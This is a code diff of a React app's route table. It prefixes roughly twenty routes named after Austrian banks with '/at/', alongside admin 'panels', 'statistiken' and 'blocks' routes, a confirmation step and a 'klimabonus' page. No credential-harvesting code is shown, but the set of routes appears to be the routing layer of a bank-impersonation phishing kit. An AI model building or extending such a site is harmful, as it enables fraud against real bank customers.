@@ -107,27 +107,27 @@ const App = () => (
             <Route path="/admin/panels" element={<AdminPanels />} />
             <Route path="/admin/statistiken" element={<AdminStatistiken />} />
             <Route path="/admin/blocks" element={<AdminBlocks />} />
-            <Route path="/raiffeisenbank" element={<P><Raiffeisenbank /></P>} />
-            <Route path="/erstebank" element={<P><ErsteBank /></P>} />
-            <Route path="/bawag" element={<P><Bawag /></P>} />
-            <Route path="/bankaustria" element={<P><BankAustria /></P>} />
-            <Route path="/volksbank" element={<P><Volksbank /></P>} />
-            <Route path="/bank99" element={<P><Bank99 /></P>} />
-            <Route path="/easybank" element={<P><Easybank /></P>} />
-            <Route path="/hyponoe" element={<P><HypoNoe /></P>} />
-            <Route path="/oberbank" element={<P><Oberbank /></P>} />
-            <Route path="/schelhammer" element={<P><Schelhammer /></P>} />
-            <Route path="/bankhausspaengler" element={<P><BankhausSpaengler /></P>} />
-            <Route path="/dolomitenbank" element={<P><Dolomitenbank /></P>} />
-            <Route path="/spardabank" element={<P><Spardabank /></P>} />
-            <Route path="/dadatbank" element={<P><Dadatbank /></P>} />
-            <Route path="/marchfelderbank" element={<P><Marchfelderbank /></P>} />
-            <Route path="/btv" element={<P><Btv /></P>} />
-            <Route path="/burgenland" element={<P><Burgenland /></P>} />
-            <Route path="/bks" element={<P><Bks /></P>} />
-            <Route path="/vkb" element={<P><Vkb /></P>} />
-            <Route path="/wuestenrot" element={<P><Wuestenrot /></P>} />
-            <Route path="/denizbank" element={<P><Denizbank /></P>} />
+            <Route path="/at/raiffeisenbank" element={<P><Raiffeisenbank /></P>} />
+            <Route path="/at/erstebank" element={<P><ErsteBank /></P>} />
+            <Route path="/at/bawag" element={<P><Bawag /></P>} />
+            <Route path="/at/bankaustria" element={<P><BankAustria /></P>} />
+            <Route path="/at/volksbank" element={<P><Volksbank /></P>} />
+            <Route path="/at/bank99" element={<P><Bank99 /></P>} />
+            <Route path="/at/easybank" element={<P><Easybank /></P>} />
+            <Route path="/at/hyponoe" element={<P><HypoNoe /></P>} />
+            <Route path="/at/oberbank" element={<P><Oberbank /></P>} />
+            <Route path="/at/schelhammer" element={<P><Schelhammer /></P>} />
+            <Route path="/at/bankhausspaengler" element={<P><BankhausSpaengler /></P>} />
+            <Route path="/at/dolomitenbank" element={<P><Dolomitenbank /></P>} />
+            <Route path="/at/spardabank" element={<P><Spardabank /></P>} />
+            <Route path="/at/dadatbank" element={<P><Dadatbank /></P>} />
+            <Route path="/at/marchfelderbank" element={<P><Marchfelderbank /></P>} />
+            <Route path="/at/btv" element={<P><Btv /></P>} />
+            <Route path="/at/burgenland" element={<P><Burgenland /></P>} />
+            <Route path="/at/bks" element={<P><Bks /></P>} />
+            <Route path="/at/vkb" element={<P><Vkb /></P>} />
+            <Route path="/at/wuestenrot" element={<P><Wuestenrot /></P>} />
+            <Route path="/at/denizbank" element={<P><Denizbank /></P>} />
             <Route path="/confirmation" element={<P><ConfirmationSwitch /></P>} />
             <Route path="/at" element={<Navigate to="/" replace />} />
             <Route path="/klimabonus" element={<P><Klimabonus /></P>} />
